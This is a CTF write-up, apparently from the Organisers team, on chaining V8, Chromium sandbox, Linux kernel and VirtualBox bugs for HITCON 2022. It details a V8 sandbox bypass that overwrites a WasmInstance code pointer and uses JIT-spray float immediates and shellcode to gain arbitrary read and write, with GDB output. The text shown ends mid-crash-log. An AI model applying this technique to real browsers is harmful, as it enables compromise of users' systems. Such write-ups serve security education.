@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Fourchain - One For All | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Fourchain - One For All" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/HITCON-2022/pwn/fourchain-fullchain.html" />
+<meta property="og:url" content="https://org.anize.rs/HITCON-2022/pwn/fourchain-fullchain.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Fourchain - One For All" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"Fourchain - One For All","url":"https://org.anize.rs/HITCON-2022/pwn/fourchain-fullchain.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="fourchain---one-for-all">Fourchain - One For All</h1>
+
+<p><strong>Authors:</strong> <a href="https://twitter.com/_MatteoRizzo">Nspace</a>, <a href="https://twitter.com/galli_leo_">gallileo</a></p>
+
+<p><strong>Tags:</strong> pwn, browser, v8, linux, virtualbox</p>
+
+<p><strong>Points:</strong> 500</p>
+
+<blockquote>
+  <p>One challenge for all the vulnerabilities.</p>
+
+  <p>All these years of training has lead to this moment.</p>
+
+  <p>Show us who’s the best pwner in the world !</p>
+</blockquote>
+
+<p>The last challenge in the series is about chaining together the four bugs. The challenge runs Linux with the vulnerable module inside the patched Virtualbox, and runs the patched Chromium with both bugs inside this VM. We can provide the URL of our own webpage and the challenge will open it in the patched Chromium. We have to get the flag which is outside the VM.</p>
+
+<p>Escaping the VM once we have a root shell inside is easy, we only need to load the exploit module from the VM escape challenge. Getting a root shell from an unsandboxed unprivileged shell is also easy because we can reuse the kernel exploit from the kernel challenge. The only part that is slightly more problematic is chaining the renderer compromise with the browser sandbox escape.</p>
+
+<p>The sandbox escape needs to send Mojo messages to the browser process to interact with the vulnerable IPC service. The easiest way to do that from a compromised renderer is to enable MojoJS. Using MojoJS also means that we can reuse the exploit from the sandbox escape part unmodified which is nice because it saves us some work. There is a well-documented way to enable Mojo in a compromised renderer with arbitrary R/W, described by Mark Brand in a <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1755">Project Zero bug</a>. I reused <a href="https://github.com/google/google-ctf/blob/master/2021/quals/pwn-fullchain/healthcheck/chromium_exploit.html#L122">the code</a> that I wrote for the Full Chain challenge at Google CTF 2021 for this.</p>
+
+<p>Now the only thing we need is arbitrary read and write in the renderer. Unfortunately we had cheesed the V8 challenge by loading the flag into the sandboxed heap with <code class="language-plaintext highlighter-rouge">Realm.eval</code> instead of actually bypassing the V8 sandbox. This was good enough for that challenge where we only had to read a file, but it won’t work here. We need an actual bypass for the V8 sandbox.</p>
+
+<h2 id="uncheesing-the-v8-exploit">Uncheesing the V8 Exploit</h2>
+
+<p>Earlier this year DiceCTF had <a href="https://ctftime.org/task/18826">a challenge</a> where players had to find bypasses for the V8 sandbox. The sandbox is now enabled by default in V8 but it’s still pretty new and there are many bypasses that haven’t been fixed yet. Funnily enough I had discovered the <code class="language-plaintext highlighter-rouge">Realm.eval</code> cheese when attempting to solve that challenge near the end of the CTF but I couldn’t use it because the flag was located at an unguessable path. I remembered that Kylebot from Shellphish had published <a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/">a writeup</a> for that challenge so I started by reading it.</p>
+
+<p>Kylebot’s bypass uses WASM and overwrites <code class="language-plaintext highlighter-rouge">imported_mutable_globals</code> in a <code class="language-plaintext highlighter-rouge">WasmInstance</code> object to get arbitrary read and write. Unfortunately this bypass <a href="https://source.chromium.org/chromium/_/chromium/v8/v8.git/+/5c152a0f7b53ad24c4e103daad3cbfa94d51c29d">has been patched out</a> and doesn’t work anymore in the version of V8 used in this challenge. Even then I still thought I should take a look at the <code class="language-plaintext highlighter-rouge">WasmInstance</code> because it had a lot of native pointers in Kylebot’s writeup:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x12af00197ff5</span> <span class="o">&lt;</span><span class="n">Instance</span> <span class="nb">map</span> <span class="o">=</span> <span class="mh">0x12af00195f89</span><span class="o">&gt;</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">tele</span> <span class="mh">0x12af00197ff4</span>
+<span class="mi">00</span><span class="p">:</span><span class="mi">0000</span><span class="err">│</span>  <span class="mh">0x12af00197ff4</span> <span class="err">◂—</span> <span class="mh">0x225900195f89</span>
+<span class="mi">01</span><span class="p">:</span><span class="mi">0008</span><span class="err">│</span>  <span class="mh">0x12af00197ffc</span> <span class="err">◂—</span> <span class="mh">0x225900002259</span> <span class="o">/*</span> <span class="s">'Y"'</span> <span class="o">*/</span>
+<span class="mi">02</span><span class="p">:</span><span class="mi">0010</span><span class="err">│</span>  <span class="mh">0x12af00198004</span> <span class="err">◂—</span> <span class="mh">0x34c900002259</span> <span class="o">/*</span> <span class="s">'Y"'</span> <span class="o">*/</span>
+<span class="mi">03</span><span class="p">:</span><span class="mi">0018</span><span class="err">│</span>  <span class="mh">0x12af0019800c</span> <span class="err">◂—</span> <span class="mh">0x34c9</span>
+<span class="mi">04</span><span class="p">:</span><span class="mi">0020</span><span class="err">│</span>  <span class="mh">0x12af00198014</span> <span class="err">◂—</span> <span class="mh">0x180010000000000</span>
+<span class="mi">05</span><span class="p">:</span><span class="mi">0028</span><span class="err">│</span>  <span class="mh">0x12af0019801c</span> <span class="err">◂—</span> <span class="mh">0x10000</span>
+<span class="mi">06</span><span class="p">:</span><span class="mi">0030</span><span class="err">│</span>  <span class="mh">0x12af00198024</span> <span class="err">—▸</span> <span class="mh">0x5555569b5b60</span> <span class="err">—▸</span> <span class="mh">0x7ffffff07c60</span> <span class="err">◂—</span> <span class="mh">0x7ffffff07c60</span>
+<span class="mi">07</span><span class="p">:</span><span class="mi">0038</span><span class="err">│</span>  <span class="mh">0x12af0019802c</span> <span class="err">—▸</span> <span class="mh">0x555556a1ba70</span> <span class="err">◂—</span> <span class="mh">0x500000000</span>
+<span class="mi">08</span><span class="p">:</span><span class="mi">0040</span><span class="err">│</span>  <span class="mh">0x12af00198034</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mi">09</span><span class="p">:</span><span class="mi">0048</span><span class="err">│</span>  <span class="mh">0x12af0019803c</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mi">0</span><span class="n">a</span><span class="p">:</span><span class="mi">0050</span><span class="err">│</span>  <span class="mh">0x12af00198044</span> <span class="err">◂—</span> <span class="mh">0xffffffffff000000</span>
+<span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">0058</span><span class="err">│</span>  <span class="mh">0x12af0019804c</span> <span class="err">—▸</span> <span class="mh">0x5555569b5b40</span> <span class="err">—▸</span> <span class="mh">0x12af00000000</span> <span class="err">◂—</span> <span class="mh">0xb000</span>
+<span class="mi">0</span><span class="n">c</span><span class="p">:</span><span class="mi">0060</span><span class="err">│</span>  <span class="mh">0x12af00198054</span> <span class="err">—▸</span> <span class="mh">0x3a0e9c984000</span> <span class="err">◂—</span> <span class="n">jmp</span> <span class="mh">0x3a0e9c984640</span> <span class="o">/*</span> <span class="mh">0xcccccc0000063be9</span> <span class="o">*/</span>
+<span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">0068</span><span class="err">│</span>  <span class="mh">0x12af0019805c</span> <span class="err">—▸</span> <span class="mh">0x5555569c2a48</span> <span class="err">—▸</span> <span class="mh">0x12af0005213c</span> <span class="err">◂—</span> <span class="mh">0x5bd88000022c9</span>
+<span class="mi">0</span><span class="n">e</span><span class="p">:</span><span class="mi">0070</span><span class="err">│</span>  <span class="mh">0x12af00198064</span> <span class="err">—▸</span> <span class="mh">0x5555569c2a40</span> <span class="err">—▸</span> <span class="mh">0x12af000497e4</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mi">0</span><span class="n">f</span><span class="p">:</span><span class="mi">0078</span><span class="err">│</span>  <span class="mh">0x12af0019806c</span> <span class="err">—▸</span> <span class="mh">0x5555569c2a68</span> <span class="err">—▸</span> <span class="mh">0x12af001c0000</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mi">10</span><span class="p">:</span><span class="mi">0080</span><span class="err">│</span>  <span class="mh">0x12af00198074</span> <span class="err">—▸</span> <span class="mh">0x5555569c2a60</span> <span class="err">—▸</span> <span class="mh">0x12af00198224</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mi">11</span><span class="p">:</span><span class="mi">0088</span><span class="err">│</span>  <span class="mh">0x12af0019807c</span> <span class="err">—▸</span> <span class="mh">0x5555569b5b50</span> <span class="err">—▸</span> <span class="mh">0x7ffffff07c60</span> <span class="err">◂—</span> <span class="mh">0x7ffffff07c60</span>
+<span class="mi">12</span><span class="p">:</span><span class="mi">0090</span><span class="err">│</span>  <span class="mh">0x12af00198084</span> <span class="err">—▸</span> <span class="mh">0x5555569d7889</span> <span class="err">◂—</span> <span class="mh">0x100000000</span>
+<span class="mi">13</span><span class="p">:</span><span class="mi">0098</span><span class="err">│</span>  <span class="mh">0x12af0019808c</span> <span class="err">—▸</span> <span class="mh">0x555556a270c0</span> <span class="err">◂—</span> <span class="mh">0x7fff001b7740</span>
+<span class="mi">14</span><span class="p">:</span><span class="mi">00</span><span class="n">a0</span><span class="err">│</span>  <span class="mh">0x12af00198094</span> <span class="err">◂—</span> <span class="mh">0x34c9000034c9</span>
+<span class="mi">15</span><span class="p">:</span><span class="mi">00</span><span class="n">a8</span><span class="err">│</span>  <span class="mh">0x12af0019809c</span> <span class="err">◂—</span> <span class="mh">0x4958d000034c9</span>
+<span class="mi">16</span><span class="p">:</span><span class="mi">00</span><span class="n">b0</span><span class="err">│</span>  <span class="mh">0x12af001980a4</span> <span class="err">◂—</span> <span class="mh">0x182dad0004975d</span>
+<span class="mi">17</span><span class="p">:</span><span class="mi">00</span><span class="n">b8</span><span class="err">│</span>  <span class="mh">0x12af001980ac</span> <span class="err">◂—</span> <span class="mh">0x23e100197fb1</span>
+</code></pre></div></div>
+
+<p>Most of the pointers appear to be sandboxed now but there are still a few that are not. I started experimenting by overwriting each of those with 0x41414141 in GDB before calling into the wasm code and got some crashes. The most interesting one was from overwriting the pointer at offset 0x60 because it gave us RIP control:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Thread</span> <span class="mi">1</span> <span class="s">"d8"</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
+<span class="mh">0x0000000041414141</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
+<span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+<span class="err">──────────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">REGISTERS</span> <span class="o">/</span> <span class="n">show</span><span class="o">-</span><span class="n">flags</span> <span class="n">off</span> <span class="o">/</span> <span class="n">show</span><span class="o">-</span><span class="n">compact</span><span class="o">-</span><span class="n">regs</span> <span class="n">off</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────────────────────</span>
+<span class="o">*</span><span class="n">RAX</span>  <span class="mh">0x13371337</span>
+<span class="o">*</span><span class="n">RBX</span>  <span class="mh">0x7fffffffd400</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd420</span> <span class="err">◂—</span> <span class="mh">0xe</span>
+<span class="o">*</span><span class="n">RCX</span>  <span class="mh">0x555555f55631</span> <span class="err">◂—</span> <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rbx</span>
+<span class="o">*</span><span class="n">RDX</span>  <span class="mh">0x13381338</span>
+<span class="o">*</span><span class="n">RDI</span>  <span class="mh">0x555556a18620</span> <span class="err">—▸</span> <span class="mh">0x555556a0fbe0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="o">*</span><span class="n">RSI</span>  <span class="mh">0x1ccc00198735</span> <span class="err">◂—</span> <span class="mh">0x590000225900195f</span>
+<span class="o">*</span><span class="n">R8</span>   <span class="mh">0x3e359ccb128</span>
+<span class="o">*</span><span class="n">R9</span>   <span class="mh">0x1ccc00198735</span> <span class="err">◂—</span> <span class="mh">0x590000225900195f</span>
+<span class="o">*</span><span class="n">R10</span>  <span class="mh">0x7ffff7fbd080</span>
+<span class="o">*</span><span class="n">R11</span>  <span class="mh">0x7ffff7fbd090</span>
+<span class="o">*</span><span class="n">R12</span>  <span class="mh">0x2</span>
+ <span class="n">R13</span>  <span class="mh">0x5555569b2420</span> <span class="err">—▸</span> <span class="mh">0x1ccc00000000</span> <span class="err">◂—</span> <span class="mh">0xb000</span>
+ <span class="n">R14</span>  <span class="mh">0x1ccc00000000</span> <span class="err">◂—</span> <span class="mh">0xb000</span>
+<span class="o">*</span><span class="n">R15</span>  <span class="mh">0x41414141</span>
+<span class="o">*</span><span class="n">RBP</span>  <span class="mh">0x7fffffffd428</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd508</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd560</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd588</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd5f0</span> <span class="err">◂—</span> <span class="p">...</span>
+<span class="o">*</span><span class="n">RSP</span>  <span class="mh">0x7fffffffd3b8</span> <span class="err">—▸</span> <span class="mh">0x5554dff10256</span> <span class="err">◂—</span> <span class="n">lea</span> <span class="n">rsp</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x48</span><span class="p">]</span>
+<span class="o">*</span><span class="n">RIP</span>  <span class="mh">0x41414141</span>
+<span class="err">───────────────────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">DISASM</span> <span class="o">/</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span> <span class="o">/</span> <span class="nb">set</span> <span class="n">emulate</span> <span class="n">on</span> <span class="p">]</span><span class="err">───────────────────────────────────────────────────────────────────────</span>
+<span class="n">Invalid</span> <span class="n">address</span> <span class="mh">0x41414141</span>
+</code></pre></div></div>
+
+<p>This is very interesting because even though we can’t directly overwrite the generated machine code (which is RWX) we can still place some controlled data there by embedding it in immediates and then jumping into the middle of the immediate by overwriting this pointer (JIT spray attack).</p>
+
+<p>Interestingly, Kylebot notes in his writeup that</p>
+
+<blockquote>
+  <p>After a few trials, I still couldn’t let V8 to dereference this pointer. After following the trace, @adamd and I found out that the real pointer used for invoking the shellcode resides on ptmalloc heap, which is outside of the cage.</p>
+</blockquote>
+
+<p>It seems that this might have changed in newer versions of V8 and that this attack is now possible.</p>
+
+<p>The gist of the attack is that we will compile a WASM function similar to this</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">a</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">x</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span> 
+    <span class="kt">double</span> <span class="n">g1</span> <span class="o">=</span> <span class="mf">1.4501798452584495e-277</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">g2</span> <span class="o">=</span> <span class="mf">1.4499730218924257e-277</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">g3</span> <span class="o">=</span> <span class="mf">1.4632559875735264e-277</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">g4</span> <span class="o">=</span> <span class="mf">1.4364759325952765e-277</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">g5</span> <span class="o">=</span> <span class="mf">1.450128571490163e-277</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">g6</span> <span class="o">=</span> <span class="mf">1.4501798485024445e-277</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">g7</span> <span class="o">=</span> <span class="mf">1.4345589834166586e-277</span><span class="p">;</span>
+    <span class="kt">double</span> <span class="n">g8</span> <span class="o">=</span> <span class="mf">1.616527814e-314</span><span class="p">;</span>
+    
+    <span class="k">return</span> <span class="n">g1</span> <span class="o">+</span> <span class="n">g2</span> <span class="o">+</span> <span class="n">g3</span> <span class="o">+</span> <span class="n">g4</span> <span class="o">+</span> <span class="n">g5</span> <span class="o">+</span> <span class="n">g6</span> <span class="o">+</span> <span class="n">g7</span> <span class="o">+</span> <span class="n">g8</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>and choose the floating-point values so that their binary encoding is also valid machine code. By jumping into the next imediate when we run out of space we can construct an arbitrarily-long instruction sequence. And since V8’s WASM compiler is deterministic we just have to add an offset to the pointer we were just overwriting to execute our sprayed shellcode.</p>
+
+<p>By inspection in GDB we can see that the calling convention that V8 uses for WASM is register-based with 32-bit integer arguments passed in <code class="language-plaintext highlighter-rouge">eax</code>, <code class="language-plaintext highlighter-rouge">edx</code>, <code class="language-plaintext highlighter-rouge">ecx</code> and integer values are returned in <code class="language-plaintext highlighter-rouge">eax</code>. The following shellcode gives us arbitrary read and write outside of the sandbox <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sal</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mi">32</span>
+<span class="nf">or</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span>
+<span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
+<span class="nf">ret</span>
+
+<span class="nf">sal</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">32</span>
+<span class="nf">or</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rax</span>
+<span class="nf">mov</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">],</span> <span class="nb">ecx</span>
+<span class="nf">ret</span>
+</code></pre></div></div>
+
+<p>All seems good now and after figuring out the offsets we can get our arbitrary read and write:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Thread</span> <span class="mi">1</span> <span class="s">"d8"</span> <span class="n">received</span> <span class="n">signal</span> <span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">Segmentation</span> <span class="n">fault</span><span class="p">.</span>
+<span class="mh">0x0000303536423736</span> <span class="ow">in</span> <span class="err">??</span> <span class="p">()</span>
+<span class="n">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+<span class="err">──────────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">REGISTERS</span> <span class="o">/</span> <span class="n">show</span><span class="o">-</span><span class="n">flags</span> <span class="n">off</span> <span class="o">/</span> <span class="n">show</span><span class="o">-</span><span class="n">compact</span><span class="o">-</span><span class="n">regs</span> <span class="n">off</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────────────────────</span>
+ <span class="n">RAX</span>  <span class="mh">0x0</span>
+<span class="o">*</span><span class="n">RBX</span>  <span class="mh">0x5554dff173b8</span> <span class="err">◂—</span> <span class="nb">cmp</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">r13</span> <span class="o">+</span> <span class="mh">0x220</span><span class="p">]</span>
+<span class="o">*</span><span class="n">RCX</span>  <span class="mh">0x42424242</span>
+<span class="o">*</span><span class="n">RDX</span>  <span class="mh">0x41414141</span>
+<span class="o">*</span><span class="n">RDI</span>  <span class="mh">0x555556a1f080</span> <span class="err">—▸</span> <span class="mh">0x555556a1f030</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="o">*</span><span class="n">RSI</span>  <span class="mh">0x3ae300199219</span> <span class="err">◂—</span> <span class="mh">0x590000225900195f</span>
+<span class="o">*</span><span class="n">R8</span>   <span class="mh">0x4011f608d37</span>
+<span class="o">*</span><span class="n">R9</span>   <span class="mh">0x7fffffffd348</span> <span class="err">—▸</span> <span class="mh">0x3ae300199315</span> <span class="err">◂—</span> <span class="mh">0xc90019930100002f</span> <span class="o">/*</span> <span class="s">'/'</span> <span class="o">*/</span>
+<span class="o">*</span><span class="n">R10</span>  <span class="mh">0x7ffff7fbd080</span>
+<span class="o">*</span><span class="n">R11</span>  <span class="mh">0x7ffff7fbd090</span>
+<span class="o">*</span><span class="n">R12</span>  <span class="mh">0x2</span>
+<span class="o">*</span><span class="n">R13</span>  <span class="mh">0x5555569b2420</span> <span class="err">—▸</span> <span class="mh">0x3ae300000000</span> <span class="err">◂—</span> <span class="mh">0xb000</span>
+<span class="o">*</span><span class="n">R14</span>  <span class="mh">0x3ae300000000</span> <span class="err">◂—</span> <span class="mh">0xb000</span>
+<span class="o">*</span><span class="n">R15</span>  <span class="mh">0x303536423710</span> <span class="err">◂—</span> <span class="n">shl</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x20</span> <span class="o">/*</span> <span class="mh">0xbeb909020e0c148</span> <span class="o">*/</span>
+<span class="o">*</span><span class="n">RBP</span>  <span class="mh">0x7fffffffd390</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd420</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd508</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd560</span> <span class="err">—▸</span> <span class="mh">0x7fffffffd588</span> <span class="err">◂—</span> <span class="p">...</span>
+<span class="o">*</span><span class="n">RSP</span>  <span class="mh">0x7fffffffd310</span> <span class="err">—▸</span> <span class="mh">0x5554dff10256</span> <span class="err">◂—</span> <span class="n">lea</span> <span class="n">rsp</span><span class="p">,</span> <span class="p">[</span><span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x48</span><span class="p">]</span>
+<span class="o">*</span><span class="n">RIP</span>  <span class="mh">0x303536423736</span> <span class="err">◂—</span> <span class="n">mov</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">ecx</span> <span class="o">/*</span> <span class="mh">0xbeb909090c30a89</span> <span class="o">*/</span>
+<span class="err">───────────────────────────────────────────────────────────────────────</span><span class="p">[</span> <span class="n">DISASM</span> <span class="o">/</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span> <span class="o">/</span> <span class="nb">set</span> <span class="n">emulate</span> <span class="n">on</span> <span class="p">]</span><span class="err">───────────────────────────────────────────────────────────────────────</span>
+ <span class="err">►</span> <span class="mh">0x303536423736</span>    <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span><span class="p">],</span> <span class="n">ecx</span>
+   <span class="mh">0x303536423738</span>    <span class="n">ret</span>
+</code></pre></div></div>
+
+<p>Except, there is a slight problem. The code pointer that we are overwriting only seems to be used once, the first time a function in that WASM instance is called. After that it’s not used anymore and the JIT spray doesn’t work. This probably has to do with lazy compilation. Creating a new WASM instance every time we want to read or write <em>almost</em> works, but not quite. It seems that V8 <em>also</em> has a cache of compiled WASM bytecode, so if we attempt to create two completely different WASM modules that use the same bytecode it will only compile the code once, so the JIT spray attack only works on the first.</p>
+
+<p>Our solution was simply to change the WASM bytecode every time we create a new instance. We just selected some byte that didn’t appear to have an effect on the shellcode when changed and wrote some JavaScript that increments that byte every time we create a new WASM instance. Very hacky but it works.</p>
+
+<p>Now that we have arbitrary R/W in the renderer process we just need to leak the base of the <code class="language-plaintext highlighter-rouge">chrome</code> binary and enable MojoJS. There are probably tons of ways to do this, we used a pointer inside the WASM code page.</p>
+
+<p>After toggling the MojoJS flag we just have to reload the page and we will have MojoJS, so we can run the Sandbox exploit from before.</p>
+
+<p>The final exploit html can be found at the end of this page.</p>
+
+<h2 id="gui-troubles">GUI Troubles</h2>
+
+<p>Since we just had too much fun solving these challenges, we decided to go all out for the writeup and make the exploit work while running everything with a GUI (i.e. like a person normally would).
+In theory of course, this should have been a cake walk and it would only require us to install the GUI packages everywhere and set the corresponding settings / flags.
+Unfortunately, it was not that easy.</p>
+
+<p>Installing the GUI was already quite tricky and I had to setup a completely new VM for it, since installing it on my droplet resulted in all network connections being dropped.
+This proved to be a bit tricky, due to wanting to use a VM in VM setup (so I don’t accidentally mess up my actual system).
+This meant I had to use nested virtualization which should be supported by VirtualBox out of the box.
+My host OS was Windows, since that was the machine I had lying around with nested virtualization supported.
+It took many restarts and convincing Windows that I did not need any kind of safety features to disable Hyper-V and get nested virtualization in VirtualBox working.
+Now I only had to get Chrome working with a GUI, which turned out to be a bit of a pain as well.
+The build provided by the challenge authors unfortunately did not have the necessary resources and e.g. the crash handler.
+Thankfully, Nspace did a local compile of the patched Chrome for local debugging and I was able to get the GUI working by copying over random files from his build.</p>
+
+<p>Once that was out of the way, I could finally start.
+After some very minor tweaking, the last two steps worked quite well again, even with the GUI.
+However, the first two stages were not working at all.
+The first stage, was failing to leak the code pointer and it turns out that the read outside the V8 sandbox was broken.
+I wasted quite some time here until I finally (grudgingly) installed gdb in the inner VM and attached to chrome.
+It turns out, that my new setup was using different instructions (likely due to being an AMD CPU) for compiling the WASM code and hence the offset used had to change.
+Once that was fixed, the first stage was working again.</p>
+
+<p>The second stage was still broken though and would always crash at the same place with similar register contents:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Received</span> <span class="n">signal</span> <span class="mi">11</span> <span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span> <span class="mo">000000000000</span>
+<span class="cp">#0 0x55fa415d15b2 base::debug::CollectStackTrace()
+#1 0x55fa41537783 base::debug::StackTrace::StackTrace()
+#2 0x55fa415d10d1 base::debug::(anonymous namespace)::StackDumpSignalHandler()
